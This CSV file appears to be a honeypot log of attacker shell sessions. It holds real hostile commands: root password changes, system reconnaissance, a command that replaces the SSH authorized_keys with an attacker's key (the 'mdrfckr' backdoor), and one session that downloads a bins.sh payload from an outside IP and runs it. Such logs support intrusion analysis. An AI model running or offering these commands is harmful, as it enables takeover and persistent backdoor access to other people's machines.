,session,duration,command_freq,input
4293,5f72aa3a7d60,7.06696605682373,18,cat /proc/cpuinfo | grep name | wc -l
4294,5f72aa3a7d60,7.06696605682373,18,"echo -e ""apache123123\nvVbu0EnMLH3q\nvVbu0EnMLH3q""|passwd|bash"
4295,5f72aa3a7d60,7.06696605682373,18,Enter new UNIX password: 
4296,5f72aa3a7d60,7.06696605682373,18,Enter new UNIX password:
4297,5f72aa3a7d60,7.06696605682373,18,"echo ""apache123123\nvVbu0EnMLH3q\nvVbu0EnMLH3q\n""|passwd"
4298,5f72aa3a7d60,7.06696605682373,18,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
4299,5f72aa3a7d60,7.06696605682373,18,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
4300,5f72aa3a7d60,7.06696605682373,18,ls -lh $(which ls)
4301,5f72aa3a7d60,7.06696605682373,18,which ls
4302,5f72aa3a7d60,7.06696605682373,18,crontab -l
4303,5f72aa3a7d60,7.06696605682373,18,w
4304,5f72aa3a7d60,7.06696605682373,18,uname -m
4305,5f72aa3a7d60,7.06696605682373,18,cat /proc/cpuinfo | grep model | grep name | wc -l
4306,5f72aa3a7d60,7.06696605682373,18,top
4307,5f72aa3a7d60,7.06696605682373,18,uname
4308,5f72aa3a7d60,7.06696605682373,18,uname -a
4309,5f72aa3a7d60,7.06696605682373,18,lscpu | grep Model
4310,5f72aa3a7d60,7.06696605682373,18,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"
4311,b55f55d2bde5,7.668771982192993,15,cat /proc/cpuinfo | grep name | wc -l
4312,b55f55d2bde5,7.668771982192993,15,"echo ""root:N7Gy6YLlpZd0""|chpasswd|bash"
4313,b55f55d2bde5,7.668771982192993,15,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
4314,b55f55d2bde5,7.668771982192993,15,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
4315,b55f55d2bde5,7.668771982192993,15,ls -lh $(which ls)
4316,b55f55d2bde5,7.668771982192993,15,which ls
4317,b55f55d2bde5,7.668771982192993,15,crontab -l
4318,b55f55d2bde5,7.668771982192993,15,w
4319,b55f55d2bde5,7.668771982192993,15,uname -m
4320,b55f55d2bde5,7.668771982192993,15,cat /proc/cpuinfo | grep model | grep name | wc -l
4321,b55f55d2bde5,7.668771982192993,15,top
4322,b55f55d2bde5,7.668771982192993,15,uname
4323,b55f55d2bde5,7.668771982192993,15,uname -a
4324,b55f55d2bde5,7.668771982192993,15,lscpu | grep Model
4325,b55f55d2bde5,7.668771982192993,15,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"
4326,b71b598a1a42,12.906570434570312,15,cat /proc/cpuinfo | grep name | wc -l
4327,b71b598a1a42,12.906570434570312,15,"echo ""root:sRDwO76UK5N2""|chpasswd|bash"
4328,b71b598a1a42,12.906570434570312,15,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
4329,b71b598a1a42,12.906570434570312,15,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
4330,b71b598a1a42,12.906570434570312,15,ls -lh $(which ls)
4331,b71b598a1a42,12.906570434570312,15,which ls
4332,b71b598a1a42,12.906570434570312,15,crontab -l
4333,b71b598a1a42,12.906570434570312,15,w
4334,b71b598a1a42,12.906570434570312,15,uname -m
4335,b71b598a1a42,12.906570434570312,15,cat /proc/cpuinfo | grep model | grep name | wc -l
4336,b71b598a1a42,12.906570434570312,15,top
4337,b71b598a1a42,12.906570434570312,15,uname
4338,b71b598a1a42,12.906570434570312,15,uname -a
4339,b71b598a1a42,12.906570434570312,15,lscpu | grep Model
4340,b71b598a1a42,12.906570434570312,15,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"
4341,3ccb8e170a51,31.79839253425598,18,cat /proc/cpuinfo | grep name | wc -l
4342,3ccb8e170a51,31.79839253425598,18,"echo -e ""1qaz\nzFl3iEkNvEgc\nzFl3iEkNvEgc""|passwd|bash"
4343,3ccb8e170a51,31.79839253425598,18,Enter new UNIX password: 
4344,3ccb8e170a51,31.79839253425598,18,Enter new UNIX password:
4345,3ccb8e170a51,31.79839253425598,18,"echo ""1qaz\nzFl3iEkNvEgc\nzFl3iEkNvEgc\n""|passwd"
4346,3ccb8e170a51,31.79839253425598,18,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
4347,3ccb8e170a51,31.79839253425598,18,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
4348,3ccb8e170a51,31.79839253425598,18,ls -lh $(which ls)
4349,3ccb8e170a51,31.79839253425598,18,which ls
4350,3ccb8e170a51,31.79839253425598,18,crontab -l
4351,3ccb8e170a51,31.79839253425598,18,w
4352,3ccb8e170a51,31.79839253425598,18,uname -m
4353,3ccb8e170a51,31.79839253425598,18,cat /proc/cpuinfo | grep model | grep name | wc -l
4354,3ccb8e170a51,31.79839253425598,18,top
4355,3ccb8e170a51,31.79839253425598,18,uname
4356,3ccb8e170a51,31.79839253425598,18,uname -a
4357,3ccb8e170a51,31.79839253425598,18,lscpu | grep Model
4358,3ccb8e170a51,31.79839253425598,18,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"
4359,0458ee8040d8,15.109265089035034,15,cat /proc/cpuinfo | grep name | wc -l
4360,0458ee8040d8,15.109265089035034,15,"echo ""root:iAq6BLGIUWxQ""|chpasswd|bash"
4361,0458ee8040d8,15.109265089035034,15,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
4362,0458ee8040d8,15.109265089035034,15,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
4363,0458ee8040d8,15.109265089035034,15,ls -lh $(which ls)
4364,0458ee8040d8,15.109265089035034,15,which ls
4365,0458ee8040d8,15.109265089035034,15,crontab -l
4366,0458ee8040d8,15.109265089035034,15,w
4367,0458ee8040d8,15.109265089035034,15,uname -m
4368,0458ee8040d8,15.109265089035034,15,cat /proc/cpuinfo | grep model | grep name | wc -l
4369,0458ee8040d8,15.109265089035034,15,top
4370,0458ee8040d8,15.109265089035034,15,uname
4371,0458ee8040d8,15.109265089035034,15,uname -a
4372,0458ee8040d8,15.109265089035034,15,lscpu | grep Model
4373,0458ee8040d8,15.109265089035034,15,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"
4374,bbbf1c2490ed,15.04735231399536,15,cat /proc/cpuinfo | grep name | wc -l
4375,bbbf1c2490ed,15.04735231399536,15,"echo ""root:MXraCuclrp08""|chpasswd|bash"
4376,bbbf1c2490ed,15.04735231399536,15,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
4377,bbbf1c2490ed,15.04735231399536,15,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
4378,bbbf1c2490ed,15.04735231399536,15,ls -lh $(which ls)
4379,bbbf1c2490ed,15.04735231399536,15,which ls
4380,bbbf1c2490ed,15.04735231399536,15,crontab -l
4381,ecb527987c86,16.670591592788696,18,cat /proc/cpuinfo | grep name | wc -l
4382,bbbf1c2490ed,15.04735231399536,15,w
4383,ecb527987c86,16.670591592788696,18,"echo -e ""abc123\nhQ5es7J8KnCn\nhQ5es7J8KnCn""|passwd|bash"
4384,ecb527987c86,16.670591592788696,18,Enter new UNIX password: 
4385,ecb527987c86,16.670591592788696,18,Enter new UNIX password:
4386,bbbf1c2490ed,15.04735231399536,15,uname -m
4387,ecb527987c86,16.670591592788696,18,"echo ""abc123\nhQ5es7J8KnCn\nhQ5es7J8KnCn\n""|passwd"
4388,bbbf1c2490ed,15.04735231399536,15,cat /proc/cpuinfo | grep model | grep name | wc -l
4389,ecb527987c86,16.670591592788696,18,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
4390,bbbf1c2490ed,15.04735231399536,15,top
4391,ecb527987c86,16.670591592788696,18,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
4392,bbbf1c2490ed,15.04735231399536,15,uname
4393,ecb527987c86,16.670591592788696,18,ls -lh $(which ls)
4394,ecb527987c86,16.670591592788696,18,which ls
4395,bbbf1c2490ed,15.04735231399536,15,uname -a
4396,ecb527987c86,16.670591592788696,18,crontab -l
4397,bbbf1c2490ed,15.04735231399536,15,lscpu | grep Model
4398,ecb527987c86,16.670591592788696,18,w
4399,bbbf1c2490ed,15.04735231399536,15,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"
4400,ecb527987c86,16.670591592788696,18,uname -m
4401,ecb527987c86,16.670591592788696,18,cat /proc/cpuinfo | grep model | grep name | wc -l
4402,ecb527987c86,16.670591592788696,18,top
4403,ecb527987c86,16.670591592788696,18,uname
4404,ecb527987c86,16.670591592788696,18,uname -a
4405,ecb527987c86,16.670591592788696,18,lscpu | grep Model
4406,ecb527987c86,16.670591592788696,18,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"
4407,90612da959dc,182.4965500831604,1,cat /proc/cpuinfo | grep name | wc -l
4408,f01f850367a7,12.723068952560425,18,cat /proc/cpuinfo | grep name | wc -l
4409,f01f850367a7,12.723068952560425,18,"echo -e ""abc1234\nCDpqtvtibCpJ\nCDpqtvtibCpJ""|passwd|bash"
4410,f01f850367a7,12.723068952560425,18,Enter new UNIX password: 
4411,f01f850367a7,12.723068952560425,18,Enter new UNIX password:
4412,f01f850367a7,12.723068952560425,18,"echo ""abc1234\nCDpqtvtibCpJ\nCDpqtvtibCpJ\n""|passwd"
4413,f01f850367a7,12.723068952560425,18,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
4414,f01f850367a7,12.723068952560425,18,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
4415,f01f850367a7,12.723068952560425,18,ls -lh $(which ls)
4416,f01f850367a7,12.723068952560425,18,which ls
4417,f01f850367a7,12.723068952560425,18,crontab -l
4418,f01f850367a7,12.723068952560425,18,w
4419,f01f850367a7,12.723068952560425,18,uname -m
4420,f01f850367a7,12.723068952560425,18,cat /proc/cpuinfo | grep model | grep name | wc -l
4421,f01f850367a7,12.723068952560425,18,top
4422,f01f850367a7,12.723068952560425,18,uname
4423,f01f850367a7,12.723068952560425,18,uname -a
4424,f01f850367a7,12.723068952560425,18,lscpu | grep Model
4425,f01f850367a7,12.723068952560425,18,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"
4426,ff806abca3c5,14.701987028121948,15,cat /proc/cpuinfo | grep name | wc -l
4427,ff806abca3c5,14.701987028121948,15,"echo ""root:pHdvymSpUwz0""|chpasswd|bash"
4428,ff806abca3c5,14.701987028121948,15,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
4429,ff806abca3c5,14.701987028121948,15,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
4430,ff806abca3c5,14.701987028121948,15,ls -lh $(which ls)
4431,ff806abca3c5,14.701987028121948,15,which ls
4432,ff806abca3c5,14.701987028121948,15,crontab -l
4433,da449ade5d2c,22.37007999420166,18,cat /proc/cpuinfo | grep name | wc -l
4434,ff806abca3c5,14.701987028121948,15,w
4435,da449ade5d2c,22.37007999420166,18,"echo -e ""andrea\nazkC5S0Rn2Z6\nazkC5S0Rn2Z6""|passwd|bash"
4436,da449ade5d2c,22.37007999420166,18,Enter new UNIX password: 
4437,da449ade5d2c,22.37007999420166,18,Enter new UNIX password:
4438,ff806abca3c5,14.701987028121948,15,uname -m
4439,ff806abca3c5,14.701987028121948,15,cat /proc/cpuinfo | grep model | grep name | wc -l
4440,da449ade5d2c,22.37007999420166,18,"echo ""andrea\nazkC5S0Rn2Z6\nazkC5S0Rn2Z6\n""|passwd"
4441,ff806abca3c5,14.701987028121948,15,top
4442,da449ade5d2c,22.37007999420166,18,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
4443,ff806abca3c5,14.701987028121948,15,uname
4444,ff806abca3c5,14.701987028121948,15,uname -a
4445,da449ade5d2c,22.37007999420166,18,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
4446,ff806abca3c5,14.701987028121948,15,lscpu | grep Model
4447,da449ade5d2c,22.37007999420166,18,ls -lh $(which ls)
4448,da449ade5d2c,22.37007999420166,18,which ls
4449,ff806abca3c5,14.701987028121948,15,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"
4450,da449ade5d2c,22.37007999420166,18,crontab -l
4451,da449ade5d2c,22.37007999420166,18,w
4452,da449ade5d2c,22.37007999420166,18,uname -m
4453,da449ade5d2c,22.37007999420166,18,cat /proc/cpuinfo | grep model | grep name | wc -l
4454,da449ade5d2c,22.37007999420166,18,top
4455,da449ade5d2c,22.37007999420166,18,uname
4456,da449ade5d2c,22.37007999420166,18,uname -a
4457,da449ade5d2c,22.37007999420166,18,lscpu | grep Model
4458,da449ade5d2c,22.37007999420166,18,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"
4459,700693310282,48.706536293029785,30,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"
4460,700693310282,48.706536293029785,30,cat /proc/cpuinfo | grep name | wc -l
4461,700693310282,48.706536293029785,30,"echo -e ""operator\nEUBSGPdja1CE\nEUBSGPdja1CE""|passwd|bash"
4462,700693310282,48.706536293029785,30,Enter new UNIX password: 
4463,700693310282,48.706536293029785,30,Enter new UNIX password:
4464,700693310282,48.706536293029785,30,"echo ""operator\nEUBSGPdja1CE\nEUBSGPdja1CE\n""|passwd"
4465,700693310282,48.706536293029785,30,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
4466,700693310282,48.706536293029785,30,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
4467,700693310282,48.706536293029785,30,ls -lh $(which ls)
4468,700693310282,48.706536293029785,30,which ls
4469,700693310282,48.706536293029785,30,crontab -l
4470,700693310282,48.706536293029785,30,w
4471,700693310282,48.706536293029785,30,uname -m
4472,700693310282,48.706536293029785,30,cat /proc/cpuinfo | grep model | grep name | wc -l
4473,700693310282,48.706536293029785,30,top
4474,700693310282,48.706536293029785,30,uname
4475,700693310282,48.706536293029785,30,uname -a
4476,700693310282,48.706536293029785,30,lscpu | grep Model
4477,700693310282,48.706536293029785,30,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
4478,700693310282,48.706536293029785,30,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
4479,700693310282,48.706536293029785,30,ls -lh $(which ls)
4480,700693310282,48.706536293029785,30,which ls
4481,700693310282,48.706536293029785,30,crontab -l
4482,700693310282,48.706536293029785,30,w
4483,700693310282,48.706536293029785,30,uname -m
4484,700693310282,48.706536293029785,30,cat /proc/cpuinfo | grep model | grep name | wc -l
4485,700693310282,48.706536293029785,30,top
4486,700693310282,48.706536293029785,30,uname
4487,700693310282,48.706536293029785,30,uname -a
4488,700693310282,48.706536293029785,30,lscpu | grep Model
4489,da2fa3f1ccb8,17.30307912826538,5,sh
4490,da2fa3f1ccb8,17.30307912826538,5,shell
4491,da2fa3f1ccb8,17.30307912826538,5,shell
4492,da2fa3f1ccb8,17.30307912826538,5,ls /
4493,da2fa3f1ccb8,17.30307912826538,5,cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://31.210.20.109/bins.sh; busybox wget http://31.210.20.109/bins.sh; tftp -r bins.sh -g 31.210.20.109; busybox tftp -r bins.sh -g bins.sh; ftpget -v -u anonymous -p anonymous -P 21 31.210.20.109 bins.sh bins.sh; busybox ftpget -v -u anonymous -p anonymous -P 21 31.210.20.109 bins.sh bins.sh; chmod 777 bins.sh; busybox chmod 777 bins.sh; sh bins.sh; rm -rf bins.sh
4494,59b843030ac2,6.781432390213013,15,cat /proc/cpuinfo | grep name | wc -l
4495,59b843030ac2,6.781432390213013,15,"echo ""root:LSWvW7SNgTk0""|chpasswd|bash"
4496,59b843030ac2,6.781432390213013,15,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
4497,59b843030ac2,6.781432390213013,15,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
4498,59b843030ac2,6.781432390213013,15,ls -lh $(which ls)
4499,59b843030ac2,6.781432390213013,15,which ls
4500,59b843030ac2,6.781432390213013,15,crontab -l
4501,59b843030ac2,6.781432390213013,15,w
4502,59b843030ac2,6.781432390213013,15,uname -m
4503,59b843030ac2,6.781432390213013,15,cat /proc/cpuinfo | grep model | grep name | wc -l
4504,59b843030ac2,6.781432390213013,15,top
4505,59b843030ac2,6.781432390213013,15,uname
4506,59b843030ac2,6.781432390213013,15,uname -a
4507,59b843030ac2,6.781432390213013,15,lscpu | grep Model
4508,59b843030ac2,6.781432390213013,15,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"
4509,9409bfd9e2cf,13.51843786239624,15,cat /proc/cpuinfo | grep name | wc -l
4510,9409bfd9e2cf,13.51843786239624,15,"echo ""root:vyda3Ymu5Ly1""|chpasswd|bash"
4511,9409bfd9e2cf,13.51843786239624,15,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
4512,9409bfd9e2cf,13.51843786239624,15,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
4513,9409bfd9e2cf,13.51843786239624,15,ls -lh $(which ls)
4514,9409bfd9e2cf,13.51843786239624,15,which ls
4515,9409bfd9e2cf,13.51843786239624,15,crontab -l
4516,9409bfd9e2cf,13.51843786239624,15,w
4517,9409bfd9e2cf,13.51843786239624,15,uname -m
4518,9409bfd9e2cf,13.51843786239624,15,cat /proc/cpuinfo | grep model | grep name | wc -l
4519,9409bfd9e2cf,13.51843786239624,15,top
